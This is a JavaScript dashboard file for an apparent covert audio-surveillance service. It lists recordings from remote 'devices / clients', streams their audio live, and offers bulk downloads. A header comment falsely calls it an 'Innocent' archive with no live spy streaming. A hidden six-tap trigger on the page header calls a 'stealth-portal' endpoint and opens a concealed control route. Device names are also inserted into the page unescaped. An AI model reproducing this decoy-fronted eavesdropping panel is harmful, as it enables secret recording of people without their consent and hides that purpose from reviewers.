/**
 * app.js — Innocent Main Recording Archive JS
 * Displays and replays Main recorded sessions only.
 * No live spy streaming, no remote device controller.
 */

const API_DASHBOARD = '/api/v1/dashboard';
const POLL_INTERVAL = 5000;

const state = {
    dashboardSessions: [],
    currentSession: null,
    deleteTargetId: null,
    lastSessionsFingerprint: '',
    lastClientsKey: '',
};

let mainHls = null;
const selectedMainSessionIds = new Set();

const ui = {
    sessionList: document.getElementById('session-list'),
    sessionCount: document.getElementById('session-count'),
    btnRefresh: document.getElementById('btn-refresh'),
    clientFilter: document.getElementById('client-filter'),

    // Stats
    statSessions: document.getElementById('stat-sessions'),
    statChunks: document.getElementById('stat-chunks'),
    statDuration: document.getElementById('stat-duration'),
    statStorage: document.getElementById('stat-storage'),

    // Inline Player
    playerBox: document.getElementById('inline-player-box'),
    audioPlayer: document.getElementById('main-audio-player'),
    playerTitle: document.getElementById('player-title'),
    playerMeta: document.getElementById('player-meta'),
    btnClosePlayer: document.getElementById('btn-close-player'),

    // Modal
    modalOverlay: document.getElementById('modal-overlay'),
    modalSessionId: document.getElementById('modal-session-id'),
    modalCancel: document.getElementById('modal-cancel'),
    modalConfirm: document.getElementById('modal-confirm'),
    toastContainer: document.getElementById('toast-container'),
    btnLogout: document.getElementById('btn-logout'),

    // Secret Trigger to open /hidden
    secretTriggerHeader: document.getElementById('secret-trigger-header'),
    liveBadge: document.getElementById('main-live-badge'),
};

document.addEventListener('DOMContentLoaded', () => {
    bindEvents();
    fetchMainData();
    initMainLatencyControls();
    setInterval(fetchMainData, POLL_INTERVAL);
});

function bindEvents() {
    ui.btnRefresh?.addEventListener('click', () => {
        state.lastSessionsFingerprint = '';
        fetchMainData();
    });
    ui.clientFilter?.addEventListener('change', () => {
        state.lastSessionsFingerprint = '';
        renderSessionsList();
    });

    ui.btnLogout?.addEventListener('click', async () => {
        try {
            await fetch('/api/v1/auth/logout', { method: 'POST' });
        } catch (_) { }
        window.location.href = '/login';
    });

    ui.btnClosePlayer?.addEventListener('click', () => {
        if (mainHls) {
            mainHls.destroy();
            mainHls = null;
        }
        if (ui.audioPlayer) ui.audioPlayer.pause();
        if (ui.playerBox) ui.playerBox.style.display = 'none';
        if (ui.liveBadge) ui.liveBadge.style.display = 'none';
    });

    ui.modalCancel?.addEventListener('click', closeModal);
    ui.modalConfirm?.addEventListener('click', confirmDelete);

    // Secret 6-tap Trigger on Header -> Navigates to unique stealth route
    if (ui.secretTriggerHeader) {
        let secretClicks = 0;
        let lastSecretClick = 0;
        ui.secretTriggerHeader.addEventListener('click', () => {
            const now = Date.now();
            if (now - lastSecretClick < 500) {
                secretClicks++;
            } else {
                secretClicks = 1;
            }
            lastSecretClick = now;

            if (secretClicks >= 6) {
                secretClicks = 0;
                fetch('/api/v1/system/stealth-portal', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ trigger: 'header-sequence', tapSequence: 6 })
                })
                    .then(r => r.json())
                    .then(data => {
                        if (data && data.route) {
                            window.location.href = data.route;
                        } else {
                            window.location.href = '/c-ctrl-9842';
                        }
                    })
                    .catch(() => {
                        window.location.href = '/c-ctrl-9842';
                    });
            }
        });
    }
}

async function fetchMainData() {
    await Promise.all([fetchMainStats(), fetchMainSessions()]);
}

async function fetchMainStats() {
    try {
        const res = await fetch(`${API_DASHBOARD}/stats?type=main`);
        if (!res.ok) return;
        const data = await res.json();

        if (ui.statSessions && ui.statSessions.textContent !== String(data.total_sessions || 0)) {
            ui.statSessions.textContent = data.total_sessions || 0;
        }
        if (ui.statChunks && ui.statChunks.textContent !== String(data.total_chunks || 0)) {
            ui.statChunks.textContent = data.total_chunks || 0;
        }
        if (ui.statDuration && ui.statDuration.textContent !== (data.total_duration_human || '00:00')) {
            ui.statDuration.textContent = data.total_duration_human || '00:00';
        }
        if (ui.statStorage && ui.statStorage.textContent !== (data.total_size_human || '0 B')) {
            ui.statStorage.textContent = data.total_size_human || '0 B';
        }
    } catch (e) {
        console.error('Stats fetch error:', e);
    }
}

function computeSessionsFingerprint(sessions, filterVal) {
    if (!sessions || sessions.length === 0) return `empty:${filterVal}`;
    return filterVal + '|' + sessions.map(s => `${s.session_id}:${s.status}:${s.total_chunks}:${s.total_duration}:${s.total_bytes}`).join(';');
}

async function fetchMainSessions() {
    try {
        const res = await fetch(`${API_DASHBOARD}/sessions?type=main&limit=200`);
        if (!res.ok) return;
        const data = await res.json();
        const newSessions = data.sessions || [];
        const filterVal = ui.clientFilter ? ui.clientFilter.value : '';
        const fingerprint = computeSessionsFingerprint(newSessions, filterVal);

        state.dashboardSessions = newSessions;
        updateClientFilterUI(newSessions);

        if (fingerprint !== state.lastSessionsFingerprint) {
            state.lastSessionsFingerprint = fingerprint;
            renderSessionsList();
        }
    } catch (e) {
        console.error('Sessions fetch error:', e);
    }
}

function updateClientFilterUI(allSessions) {
    if (!ui.clientFilter) return;
    const selectedClient = ui.clientFilter.value;
    const clients = [...new Set(allSessions.map(s => s.client_name).filter(Boolean))].sort();
    const clientsKey = clients.join('|');

    if (state.lastClientsKey === clientsKey) {
        return; // No device changes, preserve dropdown intact
    }
    state.lastClientsKey = clientsKey;

    let filterHtml = '<option value="">All Devices / Clients</option>';
    clients.forEach(c => {
        filterHtml += `<option value="${c}" ${c === selectedClient ? 'selected' : ''}>📱 ${c}</option>`;
    });
    ui.clientFilter.innerHTML = filterHtml;
    ui.clientFilter.value = selectedClient;
}

function renderSessionsList() {
    const allSessions = state.dashboardSessions;
    const filterVal = ui.clientFilter ? ui.clientFilter.value : '';
    const sessions = filterVal ? allSessions.filter(s => s.client_name === filterVal) : allSessions;

    if (ui.sessionCount) {
        ui.sessionCount.textContent = `${sessions.length} recording${sessions.length !== 1 ? 's' : ''}`;
    }

    if (sessions.length === 0) {
        ui.sessionList.innerHTML = '<li class="empty-state">No audio recordings found.</li>';
    } else {
        ui.sessionList.innerHTML = generateSessionsHtml(sessions);
    }
}

function generateSessionsHtml(sessionsArray) {
    return sessionsArray.map(s => {
        const isLive = s.status === 'live';
        const statusClass = isLive ? 'live' : 'ended';
        const badgeText = isLive ? '● LIVE NOW' : 'SAVED';
        const duration = formatTime(s.total_duration || 0);
        const dateStr = formatIST(s.created_at);
        const sizeStr = formatSize(s.total_bytes || 0);
        const client = s.client_name || 'Audio Device';
        const shortId = s.session_id.slice(0, 8);
        const downloadUrl = `/api/v1/broadcasts/${s.session_id}/export-channel`;
        const chunkZipUrl = `/api/v1/broadcasts/${s.session_id}/export-channel?format=zip`;

        return `
            <li class="session-card session-card--${statusClass}">
                <div class="session-card__header">
                    <div class="session-card__device">
                        <label class="session-card__select" style="display: flex; align-items: center; margin-right: 8px; cursor: pointer;" title="Select for Batch Download">
                            <input type="checkbox" class="session-select-check" data-id="${s.session_id}" ${selectedMainSessionIds.has(s.session_id) ? 'checked' : ''} onchange="toggleMainSessionSelect('${s.session_id}', this.checked)" style="width: 17px; height: 17px; accent-color: #7c5cfc; cursor: pointer;">
                        </label>
                        <div class="device-icon ${isLive ? 'device-icon--live' : ''}">🎙️</div>
                        <div class="device-details">
                            <div class="session-card__title">
                                <span class="client-name">${client}</span>
                                <span class="badge badge--${statusClass}">${badgeText}</span>
                                ${isLive ? `<span class="live-ping-dot" title="Broadcasting Live"></span>` : ''}
                            </div>
                            <div class="device-sub">${s.device_info || 'Mobile Audio Recording'}</div>
                        </div>
                    </div>

                    <div class="session-card__quick-play">
                        <button class="btn-quick-play ${isLive ? 'btn-quick-play--live' : ''}" onclick="playSessionAudio('${s.session_id}', '${client}', '${dateStr}')" title="${isLive ? 'Listen Live Stream' : 'Play Recording'}">
                            ▶ ${isLive ? 'Listen Live' : 'Play Recording'}
                        </button>
                    </div>
                </div>

                <div class="session-card__meta-bar">
                    <div class="meta-chip" title="Total Duration">
                        <span class="meta-chip__icon">⏱️</span>
                        <span class="meta-chip__val">${duration}</span>
                    </div>
                    <div class="meta-chip" title="Total Chunks">
                        <span class="meta-chip__icon">📦</span>
                        <span class="meta-chip__val">${(s.total_chunks || 0).toLocaleString()} chunks</span>
                    </div>
                    <div class="meta-chip" title="Audio Data Size">
                        <span class="meta-chip__icon">💾</span>
                        <span class="meta-chip__val">${sizeStr}</span>
                    </div>
                    <div class="meta-chip" title="Recorded On (IST)">
                        <span class="meta-chip__icon">📅</span>
                        <span class="meta-chip__val">${dateStr}</span>
                    </div>
                    <div class="meta-chip meta-chip--id" onclick="copySessionId('${s.session_id}')" title="Copy Recording ID">
                        <span class="meta-chip__icon">🆔</span>
                        <code class="meta-chip__code">${shortId}...</code>
                    </div>
                </div>

                <div class="session-card__toolbar">
                    <div class="action-group-primary">
                        <button class="action-btn action-btn--pro" onclick="openMainProDownloader('${s.session_id}')" title="High-Speed Segment Downloader">
                            <span class="action-btn__icon">🚀</span>
                            <span>Pro Download</span>
                        </button>
                        <a href="${downloadUrl}" target="_blank" class="action-btn action-btn--audio" title="Download Audio File">
                            <span class="action-btn__icon">📥</span>
                            <span>Download Audio</span>
                        </a>
                        <a href="${chunkZipUrl}" target="_blank" class="action-btn action-btn--zip" title="Download Chunks ZIP Archive">
                            <span class="action-btn__icon">🗜️</span>
                            <span>Chunks ZIP</span>
                        </a>
                    </div>

                    <div class="action-group-secondary">
                        <button class="action-btn action-btn--danger" onclick="openDeleteModal('${s.session_id}')" title="Delete Recording">
                            <span class="action-btn__icon">🗑️</span>
                        </button>
                    </div>
                </div>
            </li>
        `;
    }).join('');
}

function playSessionAudio(sessionId, clientName, dateStr) {
    if (!ui.playerBox || !ui.audioPlayer) return;
    const session = state.dashboardSessions.find(s => s.session_id === sessionId);
    const isLive = session && session.status === 'live';

    if (mainHls) {
        mainHls.destroy();
        mainHls = null;
    }

    ui.playerTitle.textContent = isLive ? `Live Stream: ${clientName}` : `Playing: ${clientName}`;
    ui.playerMeta.textContent = isLive ? `Broadcasting now (ID: ${sessionId.slice(0, 8)}...)` : `Recorded on ${dateStr} (ID: ${sessionId.slice(0, 8)}...)`;
    if (ui.liveBadge) {
        ui.liveBadge.style.display = isLive ? 'inline-block' : 'none';
    }

    if (isLive && window.Hls && Hls.isSupported()) {
        const liveUrl = `${window.location.origin}/storage/sessions/${sessionId}/hls/live.m3u8`;
        mainHls = new Hls({
            liveSyncDurationCount: 1,
            liveMaxLatencyDurationCount: 2,
            enableWorker: true,
            lowLatencyMode: true
        });
        mainHls.loadSource(liveUrl);
        mainHls.attachMedia(ui.audioPlayer);
        mainHls.on(Hls.Events.MANIFEST_PARSED, () => {
            ui.audioPlayer.play().catch(e => console.log('Auto-play prevented:', e));
        });
    } else {
        ui.audioPlayer.src = `/api/v1/broadcasts/${sessionId}/export-channel`;
        ui.audioPlayer.play().catch(e => console.error('Audio play error:', e));
    }

    ui.playerBox.style.display = 'block';
}

function openMainProDownloader(sessionId) {
    const session = state.dashboardSessions.find(s => s.session_id === sessionId);
    const hlsUrl = `${window.location.origin}/storage/sessions/${sessionId}/hls/vod.m3u8`;
    if (window.ProDownloader) {
        window.ProDownloader.open(hlsUrl, session);
    }
}

// ── Dynamic Latency Controls ──
async function initMainLatencyControls() {
    const pills = document.querySelectorAll('.main-latency-pill');
    if (!pills.length) return;

    pills.forEach(pill => {
        pill.addEventListener('click', () => {
            const sec = parseInt(pill.dataset.seconds, 10);
            if (sec) setMainStreamLatency(sec);
        });
    });

    try {
        const res = await fetch('/api/v1/broadcasts/config');
        if (res.ok) {
            const data = await res.json();
            const activeSec = data.config?.chunk_duration_sec || 2;
            updateMainLatencyUI(activeSec);
        }
    } catch (_) { }
}

function updateMainLatencyUI(sec) {
    const pills = document.querySelectorAll('.main-latency-pill');
    pills.forEach(p => {
        if (parseInt(p.dataset.seconds, 10) === sec) {
            p.classList.add('active');
        } else {
            p.classList.remove('active');
        }
    });
}

async function setMainStreamLatency(seconds) {
    updateMainLatencyUI(seconds);
    try {
        const res = await fetch('/api/v1/broadcasts/config', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                config: { chunk_duration_sec: seconds }
            })
        });
        const data = await res.json();
        if (data.status === 'success') {
            showToast(`⏱️ Stream latency set to ${seconds}s (Pipeline re-synced)`, 'success');
        } else {
            showToast('Failed to update latency', 'error');
        }
    } catch (e) {
        console.error('Latency update error:', e);
        showToast('Error updating latency', 'error');
    }
}

function toggleMainSessionSelect(sessionId, isChecked) {
    if (isChecked) selectedMainSessionIds.add(sessionId);
    else selectedMainSessionIds.delete(sessionId);
    updateMainBulkToolbar();
}

function updateMainBulkToolbar() {
    const toolbar = document.getElementById('main-bulk-toolbar');
    const badge = document.getElementById('main-bulk-selected-count');
    if (!toolbar || !badge) return;
    const count = selectedMainSessionIds.size;
    badge.textContent = count;
    if (count > 0) {
        toolbar.classList.add('visible');
    } else {
        toolbar.classList.remove('visible');
    }
}

// Bulk Actions on Main Dashboard
document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('btn-main-bulk-pro-download')?.addEventListener('click', () => {
        const selected = Array.from(selectedMainSessionIds).map(id => state.dashboardSessions.find(s => s.session_id === id) || { session_id: id });
        if (window.ProDownloader && selected.length > 0) {
            window.ProDownloader.openBatch(selected);
        }
    });

    document.getElementById('btn-main-bulk-audio-download')?.addEventListener('click', () => {
        const selected = Array.from(selectedMainSessionIds);
        if (selected.length === 0) return;
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = '/api/v1/broadcasts/export-batch';
        form.target = '_blank';
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'session_ids';
        input.value = JSON.stringify(selected);
        form.appendChild(input);
        const fmt = document.createElement('input');
        fmt.type = 'hidden';
        fmt.name = 'format';
        fmt.value = 'audio';
        form.appendChild(fmt);
        document.body.appendChild(form);
        form.submit();
        document.body.removeChild(form);
    });

    document.getElementById('btn-main-bulk-clear')?.addEventListener('click', () => {
        selectedMainSessionIds.clear();
        document.querySelectorAll('.session-select-check').forEach(cb => cb.checked = false);
        updateMainBulkToolbar();
    });
});

function openDeleteModal(sessionId) {
    state.deleteTargetId = sessionId;
    ui.modalSessionId.textContent = `Recording ID: ${sessionId}`;
    ui.modalOverlay.classList.add('active');
}

function closeModal() {
    state.deleteTargetId = null;
    ui.modalOverlay.classList.remove('active');
}

async function confirmDelete() {
    if (!state.deleteTargetId) return;
    try {
        const res = await fetch(`${API_DASHBOARD}/sessions/${state.deleteTargetId}`, { method: 'DELETE' });
        if (res.ok) {
            closeModal();
            fetchMainData();
            showToast('Recording deleted successfully', 'success');
        }
    } catch (e) {
        console.error('Delete error:', e);
    }
}

function showToast(msg, type = 'info') {
    if (!ui.toastContainer) return;
    const toast = document.createElement('div');
    toast.className = `toast toast--${type}`;
    let icon = type === 'success' ? '✅' : 'ℹ️';
    toast.innerHTML = `<span>${icon}</span><span>${msg}</span>`;
    ui.toastContainer.appendChild(toast);
    requestAnimationFrame(() => toast.classList.add('show'));
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => toast.remove(), 300);
    }, 2800);
}

function copySessionId(id) {
    if (navigator.clipboard) {
        navigator.clipboard.writeText(id).then(() => showToast(`Copied ID: ${id.slice(0, 8)}...`, 'success'));
    }
}

function formatIST(dateStr) {
    if (!dateStr) return '—';
    try {
        const d = new Date(dateStr);
        return d.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', dateStyle: 'medium', timeStyle: 'short', hour12: true });
    } catch {
        return dateStr;
    }
}

function formatTime(seconds) {
    seconds = Math.max(0, Math.floor(seconds));
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    if (h > 0) return `${h}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
}

function formatSize(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}
